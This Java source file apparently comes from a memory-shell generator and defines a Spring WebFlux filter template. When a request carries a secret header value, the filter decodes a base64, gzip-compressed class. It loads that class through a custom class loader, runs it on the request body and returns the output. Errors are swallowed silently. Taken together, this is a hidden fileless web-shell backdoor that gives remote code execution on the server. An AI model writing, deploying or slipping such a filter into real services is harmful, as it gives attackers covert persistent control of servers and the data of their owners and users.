package org.leo.jmg.mem.shell.http;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.zip.GZIPInputStream;

import org.springframework.core.io.buffer.DataBuffer;
import org.springframework.core.io.buffer.DataBufferUtils;
import org.springframework.web.server.ServerWebExchange;
import org.springframework.web.server.WebFilter;
import org.springframework.web.server.WebFilterChain;
import reactor.core.publisher.Flux;
import reactor.core.publisher.Mono;

import java.io.ByteArrayOutputStream;

public class LeoWebFluxWebFilterTpl implements WebFilter {
    private static String headerName;
    private static String headerValue;
    private static String coreClassName;
    private static String coreClass;

    private static int respCode;

    public Mono<Void> filter(final ServerWebExchange exchange, WebFilterChain chain) {
        String header = exchange.getRequest().getHeaders().getFirst(headerName);
        if (header == null || !header.contains(headerValue)) return chain.filter(exchange);
        exchange.getResponse().setRawStatusCode(respCode);
        return DataBufferUtils.join(exchange.getRequest().getBody()).flatMap(buffer -> {
            try {
                byte[] request = new byte[buffer.readableByteCount()];
                buffer.read(request);
                byte[] response = invokeCore(request);
                DataBuffer output = exchange.getResponse().bufferFactory().wrap(response);
                return exchange.getResponse().writeWith(Mono.just(output));
            } catch (Throwable ignored) {
                return exchange.getResponse().setComplete();
            } finally {
                DataBufferUtils.release(buffer);
            }
        });
    }

    private byte[] invokeCore(byte[] requestBytes) throws Exception {
        ByteArrayOutputStream exchange = new ByteArrayOutputStream();
        if (requestBytes != null) exchange.write(requestBytes);
        try {
            ((java.lang.reflect.InvocationHandler) loadCore().newInstance()).invoke(null, null, new Object[]{exchange});
        } catch (Throwable e) {
            throw new IllegalStateException("Core invocation failed", e);
        }
        return exchange.toByteArray();
    }

    private Class loadCore() throws Exception {
        ClassLoader loader = getClass().getClassLoader();
        try {
            return Class.forName(coreClassName, true, loader);
        } catch (ClassNotFoundException ignored) {
            ByteArrayOutputStream output = new ByteArrayOutputStream();
            GZIPInputStream gzip = new GZIPInputStream(
                    new ByteArrayInputStream(base64Decode(coreClass)));
            byte[] block = new byte[4096];
            int read;
            while ((read = gzip.read(block)) != -1) output.write(block, 0, read);
            gzip.close();
            byte[] bytes = output.toByteArray();
            return new Loader(loader).define(bytes);
        }
    }

    private static byte[] base64Decode(String value) throws Exception {
        try {
            Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, value);
        } catch (Exception ignored) {
            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, value);
        }
    }

    private static class Loader extends ClassLoader {
        Loader(ClassLoader parent) { super(parent); }
        Class define(byte[] bytes) { return defineClass(null, bytes, 0, bytes.length); }
    }
}
